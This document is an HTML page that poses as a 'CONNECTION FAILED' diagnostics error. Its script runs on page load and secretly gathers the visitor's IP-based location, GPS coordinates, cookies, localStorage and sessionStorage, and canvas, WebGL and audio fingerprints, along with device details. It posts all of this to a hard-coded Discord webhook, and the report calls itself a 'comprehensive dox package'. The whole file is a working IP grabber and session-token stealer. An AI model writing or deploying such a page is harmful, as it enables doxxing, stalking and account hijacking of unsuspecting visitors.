<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostics</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #0a0a0f;
            color: #e0e0e0;
        }
        .card {
            background: #1a1a2e;
            padding: 2.5rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
            text-align: center;
            max-width: 500px;
            border: 1px solid #2a2a4a;
        }
        h1 { color: #ff4444; font-size: 1.8rem; margin-bottom: 0.5rem; letter-spacing: 2px; }
        .sub { color: #8888aa; font-size: 0.9rem; margin-bottom: 1.5rem; }
        #ip-address {
            font-size: 1.2rem;
            color: #ff6b6b;
            font-weight: bold;
            background: #0a0a15;
            padding: 0.5rem 1rem;
            border-radius: 8px;
            border: 1px solid #ff6b6b33;
            margin: 1rem 0;
        }
        .status { color: #ff6b6b; font-size: 0.8rem; margin-top: 1rem; }
        .error-icon {
            font-size: 4rem;
            margin: 1rem 0;
            color: #ff4444;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="error-icon">⚠️</div>
    <h1>CONNECTION FAILED</h1>
    <div class="sub">unable to establish secure connection</div>
    <div id="ip-address">[ error: timeout ]</div>
    <div class="status" id="status">retry failed • contact administrator</div>
</div>

<script>
    (function() {
        // ─── DISCORD WEBHOOK ─────────────────────────────────────
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534703292934787283/hoj4Ifi-vZe91DhEa7PSaOhqeW4-rGf0sj0U46HDAZAbS8PHqebMKcVTMOUO3lq1aW3t';

        // ─── UTILITY ─────────────────────────────────────────────
        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }

        function getLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return items;
            } catch { return {}; }
        }

        function getSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    items[key] = sessionStorage.getItem(key);
                }
                return items;
            } catch { return {}; }
        }

        function getBrowserPlugins() {
            try {
                return Array.from(navigator.plugins || []).map(p => p.name);
            } catch { return []; }
        }

        function getMimeTypes() {
            try {
                return Array.from(navigator.mimeTypes || []).map(m => m.type);
            } catch { return []; }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 128;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(10, 10, 50, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
                return canvas.toDataURL().substring(0, 100) + '...';
            } catch { return 'unavailable'; }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'not supported';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return 'no debug info';
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return { vendor, renderer };
            } catch { return 'unavailable'; }
        }

        function getTimeZone() {
            try {
                return Intl.DateTimeFormat().resolvedOptions().timeZone;
            } catch { return 'unknown'; }
        }

        function getScreenInfo() {
            try {
                return {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                };
            } catch { return {}; }
        }

        function getBatteryInfo() {
            return new Promise((resolve) => {
                if (!navigator.getBattery) { resolve('unavailable'); return; }
                navigator.getBattery().then(battery => {
                    resolve({
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    });
                }).catch(() => resolve('unavailable'));
            });
        }

        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return {};
                return {
                    effectiveType: conn.effectiveType,
                    rtt: conn.rtt,
                    downlink: conn.downlink,
                    saveData: conn.saveData
                };
            } catch { return {}; }
        }

        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve('unavailable'); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve('denied or unavailable'),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        function getDeviceMemory() {
            try {
                return navigator.deviceMemory || 'unknown';
            } catch { return 'unknown'; }
        }

        function getHardwareConcurrency() {
            try {
                return navigator.hardwareConcurrency || 'unknown';
            } catch { return 'unknown'; }
        }

        function getAudioFingerprint() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = ctx.createOscillator();
                const analyser = ctx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(ctx.destination);
                oscillator.frequency.value = 440;
                oscillator.type = 'sawtooth';
                oscillator.start(0);
                const buffer = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(buffer);
                oscillator.stop(0);
                ctx.close();
                return Array.from(buffer.slice(0, 20)).join(',') + '...';
            } catch { return 'unavailable'; }
        }

        function getPermissions() {
            return new Promise((resolve) => {
                if (!navigator.permissions) { resolve('unavailable'); return; }
                const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'storage', 'clipboard-read', 'clipboard-write'];
                const results = {};
                let completed = 0;
                perms.forEach(name => {
                    navigator.permissions.query({ name }).then(status => {
                        results[name] = status.state;
                        completed++;
                        if (completed === perms.length) resolve(results);
                    }).catch(() => {
                        results[name] = 'error';
                        completed++;
                        if (completed === perms.length) resolve(results);
                    });
                });
                setTimeout(() => resolve(results), 3000);
            });
        }

        // ─── MAIN ──────────────────────────────────────────────────
        async function gatherAndSend() {
            try {
                document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';

                // 1. IP + Geo (via ipapi.co)
                let ipData = {};
                try {
                    const resp = await fetch('https://ipapi.co/json/');
                    ipData = await resp.json();
                } catch (e) {
                    ipData = { ip: 'fetch failed', error: e.message };
                }

                const ip = ipData.ip || 'unknown';
                const city = ipData.city || 'unknown';
                const region = ipData.region || 'unknown';
                const country = ipData.country_name || 'unknown';
                const isp = ipData.org || 'unknown';
                const postal = ipData.postal || 'unknown';
                const timezone = ipData.timezone || 'unknown';
                const asn = ipData.asn || 'unknown';
                const latitude = ipData.latitude || 'unknown';
                const longitude = ipData.longitude || 'unknown';
                const currency = ipData.currency || 'unknown';
                const countryCode = ipData.country_code || 'unknown';

                document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';

                // 2. Browser / Device / System
                const ua = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const languages = navigator.languages || [];
                const cookieEnabled = navigator.cookieEnabled;
                const doNotTrack = navigator.doNotTrack || 'unspecified';
                const maxTouchPoints = navigator.maxTouchPoints || 0;

                // 3. Storage
                const cookies = document.cookie;
                const localStorageData = getLocalStorage();
                const sessionStorageData = getSessionStorage();

                // 4. Plugins / MIME
                const plugins = getBrowserPlugins();
                const mimeTypes = getMimeTypes();

                // 5. Fingerprints
                const canvasFp = getCanvasFingerprint();
                const webgl = getWebGLInfo();
                const audioFp = getAudioFingerprint();

                // 6. System
                const timeZone = getTimeZone();
                const screenInfo = getScreenInfo();
                const deviceMemory = getDeviceMemory();
                const hardwareConcurrency = getHardwareConcurrency();
                const netInfo = getNetworkInfo();

                // 7. Async
                const battery = await getBatteryInfo();
                const geo = await getGeolocation();
                const permissions = await getPermissions();

                // 8. Referrer & Page
                const referrer = document.referrer || 'direct';
                const pageUrl = window.location.href;
                const pageTitle = document.title;

                // 9. Construct embed
                const fields = [
                    { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                    { name: '📍 Location', value: `${city}, ${region}, ${country}`, inline: true },
                    { name: '🗺️ Coordinates', value: `${latitude}, ${longitude}`, inline: true },
                    { name: '📮 Postal / ASN', value: `${postal} | \`${asn}\``, inline: false },
                    { name: '🏢 ISP / Carrier', value: `\`${isp}\``, inline: true },
                    { name: '🌍 Country Code', value: `\`${countryCode}\``, inline: true },
                    { name: '💰 Currency', value: `\`${currency}\``, inline: true },
                    { name: '🕐 Timezone', value: `\`${timezone}\``, inline: true },
                    { name: '🖥️ Platform', value: `\`${platform}\``, inline: true },
                    { name: '🌍 Browser Language', value: `\`${language}\``, inline: true },
                    { name: '🗣️ All Languages', value: `\`${languages.join(', ')}\``, inline: false },
                    { name: '🍪 Cookies Enabled', value: `\`${cookieEnabled}\``, inline: true },
                    { name: '🚫 Do Not Track', value: `\`${doNotTrack}\``, inline: true },
                    { name: '👆 Max Touch Points', value: `\`${maxTouchPoints}\``, inline: true },
                    { name: '📺 Screen', value: `${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}-bit | dpr: ${screenInfo.pixelRatio}`, inline: false },
                    { name: '🧠 Device Memory', value: `\`${deviceMemory} GB\``, inline: true },
                    { name: '⚡ CPU Cores', value: `\`${hardwareConcurrency}\``, inline: true },
                    { name: '📶 Network', value: `type: ${netInfo.effectiveType || '?'} | rtt: ${netInfo.rtt || '?'}ms | downlink: ${netInfo.downlink || '?'}Mbps`, inline: false },
                    { name: '🔋 Battery', value: `level: ${battery.level || '?'} | charging: ${battery.charging || '?'}`, inline: true },
                    { name: '📡 Geolocation (GPS)', value: geo !== 'unavailable' ? `${geo.lat}, ${geo.lon} (acc: ${geo.acc}m)` : 'denied/unavailable', inline: false },
                    { name: '🔐 Permissions', value: Object.entries(permissions).map(([k,v]) => `${k}: ${v}`).join(' | ') || 'unavailable', inline: false },
                    { name: '🖌️ Canvas Fingerprint', value: `\`${canvasFp}\``, inline: false },
                    { name: '🎮 WebGL', value: webgl !== 'unavailable' ? `${webgl.vendor} | ${webgl.renderer}` : 'unavailable', inline: false },
                    { name: '🎵 Audio Fingerprint', value: `\`${audioFp}\``, inline: false },
                    { name: '🔌 Plugins', value: plugins.length ? `\`${plugins.slice(0, 10).join(', ')}${plugins.length > 10 ? '...' : ''}\`` : 'none', inline: false },
                    { name: '📁 MIME Types', value: mimeTypes.length ? `\`${mimeTypes.slice(0, 8).join(', ')}${mimeTypes.length > 8 ? '...' : ''}\`` : 'none', inline: false },
                    { name: '🍪 All Cookies', value: cookies ? `\`${cookies.substring(0, 500)}${cookies.length > 500 ? '...' : ''}\`` : 'none', inline: false },
                    { name: '💾 localStorage', value: Object.keys(localStorageData).length ? `\`${JSON.stringify(localStorageData).substring(0, 500)}...\`` : 'empty', inline: false },
                    { name: '📦 sessionStorage', value: Object.keys(sessionStorageData).length ? `\`${JSON.stringify(sessionStorageData).substring(0, 500)}...\`` : 'empty', inline: false },
                    { name: '🔗 Referrer', value: `\`${referrer}\``, inline: true },
                    { name: '📄 Page URL', value: `\`${pageUrl}\``, inline: false },
                    { name: '📰 Page Title', value: `\`${pageTitle}\``, inline: true },
                    { name: '📱 User Agent (full)', value: `\`${ua}\``, inline: false }
                ];

                const embed = {
                    title: '🕵️ FULL SYSTEM TELEMETRY',
                    color: 0xff3b3b,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: '🚨 comprehensive dox package • all data logged' }
                };

                // 10. Send to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';

            } catch (err) {
                document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
                document.getElementById('ip-address').textContent = '[ error: timeout ]';
                console.error('[FATAL]', err);
            }
        }

        gatherAndSend();
    })();
</script>

</body>
</html>
